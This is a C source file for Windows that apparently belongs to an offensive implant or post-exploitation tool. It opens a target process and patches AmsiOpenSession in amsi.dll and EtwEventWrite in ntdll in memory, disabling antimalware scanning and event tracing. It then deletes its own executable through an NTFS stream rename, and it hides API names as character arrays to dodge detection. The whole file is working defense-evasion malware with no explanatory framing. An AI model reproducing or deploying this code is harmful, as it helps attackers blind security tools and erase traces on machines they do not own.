
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")
#include <tlhelp32.h>
#include <tchar.h>
#include "Util.h"
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);


DWORD64 GetAddr(LPVOID addr) {

	for (int i = 0; i < 1024; i++) {

		if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
	}

}
void patchitETW(HANDLE hproc) {

    
    unsigned char etwPatch[] = { 0xC3 };
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = sizeof(etwPatch);
    NTSTATUS status;
    HMODULE hNtdllDll = LoadLibrary(L"ntdll.dll");
    if (NULL == hNtdllDll)
    {
		char result[21] = "Load ntdll.dll error";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
        return;
    }
	char EtwW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e',0 };
	char ntt[] = { 'n','t','d','l','l','.','d','l','l',0 };
    void* pETWaddress = (void*)GetProcAddress(GetModuleHandleA(ntt), EtwW);

    void* lpBaseAddress = pETWaddress;

    status = NtProtectVirtualMemory(hproc, (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_READWRITE, &OldProtection);

	if (!NT_SUCCESS(status))
    {
		char result[63] =  "Failed to modify EtwEventWrite memory permission to READWRITE.";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
        return;
    }


    status = NtWriteVirtualMemory(hproc, pETWaddress, (PVOID)etwPatch, sizeof(etwPatch), NULL);

	if (!NT_SUCCESS(status))
    {
		char result[39] = "Failed to copy patch to EtwEventWrite.";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
        return;
    }

    status = NtProtectVirtualMemory(hproc, (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);

	if (!NT_SUCCESS(status))
    {
		char result[68] = "Failed to modify EtwEventWrite memory permission to original state.";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
        return;
    }
	char result[19] = "[+] ETW patched !!";
	unsigned char* res = (unsigned char*)malloc(sizeof(result));
	memcpy(res, result, sizeof(result));
	DataProcess(res, sizeof(res), 0);

}

void AMS1patch1(HANDLE hproc) {

	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);


	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\x75");

	//printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));
	void* ptraddr = (void*)((DWORD64)ptr + 0x3);
	void* ptraddr2 = (void*)GetAddr(ptr);

	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		char result[43] = "[!] Failed in NtProtectVirtualMemory1 ";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
		return;
	}
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
	if (!NT_SUCCESS(NtWriteStatus)) {
		char result[41] = "[!] Failed in NtWriteVirtualMemory ";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
		return;
	}
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		char result[39] = "[!] Failed in NtProtectVirtualMemory2 ";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
		return;
	}

	char result[20] = "[+] AMSI patched !!";
	unsigned char* res = (unsigned char*)malloc(sizeof(result));
	memcpy(res, result, sizeof(result));
	DataProcess(res, sizeof(res), 0);




}
BOOL Self_Delete() {
	const wchar_t* NewStream = L":endfile";
	WCHAR szPath[MAX_PATH * 2] = { 0 };

	// 获取当前可执行文件的路径  
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		//wcerr << L"[!] GetModuleFileNameW fail , code is  " << GetLastError() << //endl;
		return FALSE;
	}

	// 打开文件
	HANDLE hFile = CreateFileW(szPath,
		DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		//wcerr << L"[!] CreateFileW fail , code is " << GetLastError() << //endl;
		return FALSE;
	}

	// 准备重命名信息  
	SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(wchar_t) * wcslen(NewStream);
	PFILE_RENAME_INFO pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		CloseHandle(hFile);
		//wcerr << L"[!] HeapAlloc fail , code is " << GetLastError() << //endl;
		return FALSE;
	}

	pRename->FileNameLength = wcslen(NewStream) * sizeof(wchar_t);
	RtlCopyMemory(pRename->FileName, NewStream, pRename->FileNameLength);
	//wcout << L"[i] Renaming :$DATA to file data as " << NewStream << //endl;
	//SetFileInformationByHandle是用来重新设置文件名
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		//wcerr << L"[!] SetFileInformationByHandle fail, code is" << GetLastError() << //endl;
		CloseHandle(hFile);
		HeapFree(GetProcessHeap(), 0, pRename);
		return FALSE;
	}

	//wcout << L"[+] Completed" << //endl;
	CloseHandle(hFile);

	// 打开文件以删除  
	hFile = CreateFileW(szPath,
		DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL, NULL);

	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == 0) {
		//wcout << "free memory" << //endl;
		HeapFree(GetProcessHeap(), 0, pRename);
		return TRUE;
	}

	FILE_DISPOSITION_INFO Delete = { 0 };
	Delete.DeleteFile = TRUE;
	//wcout << L"[+] Deleting ....." << //endl;

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
		//wcerr << L"[!] SetFileInformationByHandle fail, code is  " << GetLastError() << //endl;
		CloseHandle(hFile);
		HeapFree(GetProcessHeap(), 0, pRename);
		return FALSE;
	}

	CloseHandle(hFile);
	HeapFree(GetProcessHeap(), 0, pRename);
	//wprintf(L"[+] Done\n");
	return TRUE;
}

//int patch(DWORD currentProcessId) {
int Duan(DWORD process) {
	HANDLE hProc;
	
	//printf("Parent Process ID: %lu\n", process);
	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, process);
	if (!hProc) {
		char result[22] = "Failed in OpenProcess";
		unsigned char* res = (unsigned char*)malloc(sizeof(result));
		memcpy(res, result, sizeof(result));
		DataProcess(res, sizeof(res), 0);
		return 2;
	}
	
	
	AMS1patch1(hProc);
	patchitETW(hProc);
	Self_Delete();


	return 0;

}